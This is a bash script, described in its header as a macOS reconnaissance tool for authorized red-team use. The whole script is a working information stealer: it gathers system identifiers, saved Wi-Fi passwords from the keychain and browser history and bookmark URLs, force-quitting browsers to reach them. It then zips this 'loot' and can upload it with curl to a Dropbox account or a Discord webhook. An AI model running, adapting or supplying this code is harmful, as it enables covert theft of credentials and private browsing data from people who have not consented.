#!/usr/bin/env bash
# macOS reconnaissance / information gathering script
# Collects system, user, network, and browser data
# ZIP file is saved NEXT TO THIS SCRIPT
# Browsers are automatically closed before history extraction
# WARNING: For authorized security testing / red-team use only.

set -u

# ────────────────────────────────────────────────
#  Config – fill in at least one if you want exfil
# ────────────────────────────────────────────────

DROPBOX_TOKEN=""           # optional Dropbox access token
DISCORD_WEBHOOK=""         # optional Discord webhook URL

# ────────────────────────────────────────────────
#  Preparation
# ────────────────────────────────────────────────

TIMESTAMP=$(date +%Y-%m-%d_%H-%M)
USERNAME=$(whoami)
LOOT_FOLDER="${USERNAME}-LOOT-${TIMESTAMP}"
LOOT_DIR="$TMPDIR${LOOT_FOLDER}"
ZIP_NAME="${LOOT_FOLDER}.zip"

mkdir -p "$LOOT_DIR" || exit 1

echo "[*] Starting collection → $LOOT_DIR"

# ────────────────────────────────────────────────
#  Basic system / user info
# ────────────────────────────────────────────────

{
    echo "┌─ Basic Info ───────────────────────────────────────"
    echo "Username:          $USERNAME"
    echo "Full name:         $(finger -m "$USERNAME" | head -n1 | awk '{for(i=2;i<=NF;i++) printf $i " "; print ""}' | sed 's/ $//')"
    echo "Hostname:          $(scutil --get ComputerName)"
    echo "Local hostname:    $(scutil --get LocalHostName)"
    echo "macOS version:     $(sw_vers -productVersion)"
    echo "Build:             $(sw_vers -buildVersion)"
    echo "Model:             $(sysctl hw.model | cut -d: -f2- | xargs)"
    echo "CPU:               $(sysctl -n machdep.cpu.brand_string)"
    echo "Memory:            $(system_profiler SPHardwareDataType | awk -F: '/Memory/ {print $2}' | xargs)"
    echo "Serial:            $(ioreg -l | awk -F\" '/IOPlatformSerialNumber/ {print $4}')"
    echo "Public IP:         $(curl -s https://api.ipify.org || echo "Failed to get public IP")"

    echo -e "\nLocal network interfaces:"
    ifconfig | grep -A 3 "inet " | grep -v inet6 | grep -v 127.0.0.1
} > "$LOOT_DIR/computerData.txt"

# ────────────────────────────────────────────────
#  Wi-Fi networks & saved passwords
# ────────────────────────────────────────────────

{
    echo -e "\n┌─ Wi-Fi ────────────────────────────────────────────"
    echo "Current SSID:      $(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk -F': ' '/ SSID/ {print $2}' || echo 'Not connected')"

    echo -e "\nSaved Wi-Fi passwords (may prompt for password):"
    for plist in ~/Library/Preferences/com.apple.airport.preferences.plist \
                 /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist; do
        if [[ -f "$plist" ]]; then
            defaults read "$plist" KnownNetworks 2>/dev/null | \
                grep -A1 SSIDString | grep SSIDString | \
                awk '{print $3}' | tr -d '";' | while read -r ssid; do
                pass=$(security find-generic-password -D "AirPort network password" -a "$ssid" -w 2>/dev/null)
                [[ -n "$pass" ]] && echo "$ssid : $pass"
            done
        fi
    done

    echo -e "\nNearby Wi-Fi networks:"
    /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | head -n 30 2>/dev/null || echo "airport scan not available"
} >> "$LOOT_DIR/computerData.txt"

# ────────────────────────────────────────────────
#  Close browsers to improve chance of reading history files
# ────────────────────────────────────────────────

echo "[*] Closing major browsers to allow file access..."

browsers=("Safari" "Google Chrome" "Microsoft Edge" "Firefox")

for app in "${browsers[@]}"; do
    if pgrep -xq "$app"; then
        echo "  → Quitting $app..."
        osascript -e "tell application \"$app\" to quit" 2>/dev/null || {
            echo "  → Graceful quit failed for $app — attempting forceful termination..."
            killall "$app" 2>/dev/null
            sleep 2
        }
    else
        echo "  → $app not running"
    fi
done

sleep 3
echo "[*] Browser shutdown attempt complete"

# ────────────────────────────────────────────────
#  Browser data – crude URL extraction (improved paths)
# ────────────────────────────────────────────────

{
    echo -e "\n┌─ Browser artifacts (URLs only) ───────────────────"
    echo "Date: $(date)"
    echo "Note: Browsers were automatically closed before this extraction"

    # Chrome variants
    for chrome_path in \
        "~/Library/Application Support/Google/Chrome/Default/" \
        "~/Library/Application Support/Google/Chrome/Profile "[0-9]"/" \
        "~/Library/Application Support/Google/Chrome/Profile "[0-9][0-9]"/"; do
        expanded=$(eval echo "$chrome_path")
        for file in History Bookmarks; do
            full="$expanded$file"
            if [[ -f "$full" ]]; then
                echo "→ Chrome-like: $full"
                strings "$full" 2>/dev/null | grep -Eai '(https?|ftp)://' | sort -u | head -n 400 || echo "  (no URLs found or file still locked)"
                echo ""
            fi
        done
    done

    # Edge
    for edge_path in \
        "~/Library/Application Support/Microsoft Edge/Default/" \
        "~/Library/Application Support/Microsoft Edge/Profile "[0-9]"/" \
        "~/Library/Application Support/Microsoft Edge/Profile "[0-9][0-9]"/"; do
        expanded=$(eval echo "$edge_path")
        for file in History Bookmarks; do
            full="$expanded$file"
            if [[ -f "$full" ]]; then
                echo "→ Edge: $full"
                strings "$full" 2>/dev/null | grep -Eai '(https?|ftp)://' | sort -u | head -n 400 || echo "  (no URLs found or file still locked)"
                echo ""
            fi
        done
    done

    # Firefox
    for ff_dir in ~/Library/Application\ Support/Firefox/Profiles/*/; do
        for file in places.sqlite favicons.sqlite; do
            full="${ff_dir}${file}"
            if [[ -f "$full" ]]; then
                echo "→ Firefox: $full"
                strings "$full" 2>/dev/null | grep -Eai '(https?|ftp)://' | sort -u | head -n 400 || echo "  (no URLs found or file still locked)"
                echo ""
            fi
        done
    done

    # Safari modern
    for safari_db in ~/Library/Safari/History.db*; do
        if [[ -f "$safari_db" ]]; then
            echo "→ Safari: $safari_db"
            strings "$safari_db" 2>/dev/null | grep -Eai '(https?|ftp)://' | sort -u | head -n 400 || echo "  (no URLs found or file still locked)"
            echo ""
        fi
    done

} > "$LOOT_DIR/BrowserData.txt"

# ────────────────────────────────────────────────
#  More artifacts
# ────────────────────────────────────────────────

{
    echo -e "\n┌─ Other ────────────────────────────────────────────"
    echo -e "\nLogin Items:"
    osascript -e 'tell application "System Events" to get the name of every login item' 2>/dev/null || echo "None found"

    echo -e "\nUser LaunchAgents:"
    ls -la ~/Library/LaunchAgents 2>/dev/null || echo "None"

    echo -e "\nRecent files (ls -lat ~ | head):"
    ls -lat ~ | head -n 40

    echo -e "\nDisks:"
    df -h
} >> "$LOOT_DIR/computerData.txt"

# ────────────────────────────────────────────────
#  Packaging – save NEXT TO THE SCRIPT
# ────────────────────────────────────────────────

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
OUTPUT_ZIP="$SCRIPT_DIR/$ZIP_NAME"

echo "[*] Compressing loot to current directory..."
ditto -c -k --sequesterRsrc --keepParent "$LOOT_DIR" "$OUTPUT_ZIP"

# Optional: also keep the uncompressed folder next to the script
# Uncomment the next two lines if you want both zip + folder:
# cp -R "$LOOT_DIR" "$SCRIPT_DIR/$LOOT_FOLDER"
# echo "    Uncompressed folder saved to: $SCRIPT_DIR/$LOOT_FOLDER"

# Optional Dropbox upload
if [[ -n "$DROPBOX_TOKEN" ]]; then
  echo "[*] Uploading to Dropbox..."
  curl -X POST https://content.dropboxapi.com/2/files/upload \
    --header "Authorization: Bearer $DROPBOX_TOKEN" \
    --header "Dropbox-API-Arg: {\"path\": \"/${ZIP_NAME}\",\"mode\": \"add\",\"autorename\": true}" \
    --header "Content-Type: application/octet-stream" \
    --data-binary @"$OUTPUT_ZIP"
fi

# Optional Discord upload
if [[ -n "$DISCORD_WEBHOOK" ]]; then
  echo "[*] Sending to Discord..."
  curl -F file=@"$OUTPUT_ZIP" "$DISCORD_WEBHOOK"
fi

# ────────────────────────────────────────────────
#  Clean up – only remove the temporary folder
# ────────────────────────────────────────────────

rm -rf "$LOOT_DIR" 2>/dev/null
# IMPORTANT: We do NOT delete $OUTPUT_ZIP

echo "[*] Done."
echo "    Zip file saved to → $OUTPUT_ZIP"
echo "    Folder location  → $SCRIPT_DIR"
echo "    Quick open:       open \"$SCRIPT_DIR\""